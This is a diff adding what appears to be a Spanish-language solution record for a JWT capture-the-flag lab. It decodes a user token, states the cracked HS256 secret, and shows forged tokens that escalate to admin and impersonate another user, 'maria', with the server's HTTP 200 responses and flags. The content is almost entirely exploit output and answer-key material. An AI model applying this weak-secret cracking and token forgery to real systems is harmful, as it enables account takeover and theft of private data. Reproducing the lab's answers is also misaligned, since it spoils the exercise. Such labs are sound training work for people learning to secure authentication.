@@ -1,0 +1,28 @@
+### R1 - token real de diego (claim nota_interna no deberia viajar)
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0NDk0NjA0LCJleHAiOjE3OTQ0OTgyMDQsIm5vdGFfaW50ZXJuYSI6ImRlcGxveS10YWcgRkxBR3tqd3Rfc29sb19iYXNlNjR9In0.lIedYSpfE3moFw2uOdTRtdSE6MBdvX8T8enkk9mpyRo
+
+HEADER:  {
+  "alg": "HS256",
+  "typ": "JWT"
+}
+PAYLOAD: {
+  "sub": "diego",
+  "role": "user",
+  "iat": 1794494604,
+  "exp": 1794498204,
+  "nota_interna": "deploy-tag FLAG{jwt_solo_base64}"
+}
+FIRMA:   94879d612a5f1379a8170dae39d4d1b5…
+
+### R2a - crack offline del secreto
+SECRETO: mate123
+
+### R2b - forja role=admin -> /admin
+token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDQ5NDYwNCwiZXhwIjoxNzk0NDk4MjA0fQ.YHvh-Tv4lvwJGUqo_cS-cObhptMKuQU-RGkQ1wTVK2g
+{"panel": "admin", "auditoria": "FLAG{jwt_forjado_admin}"}
+HTTP 200
+
+### R3 - forja sub=maria -> /perfil
+token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtYXJpYSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzk0NDk0NjA0LCJleHAiOjE3OTQ0OTgyMDR9.pOnQEmHSIUBp70zuByygbLt5rH7K3Yhq5BAfTdYaJUA
+{"usuario": "maria", "role": "user", "datos": "Legajo 1007 \u2014 Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
+HTTP 200
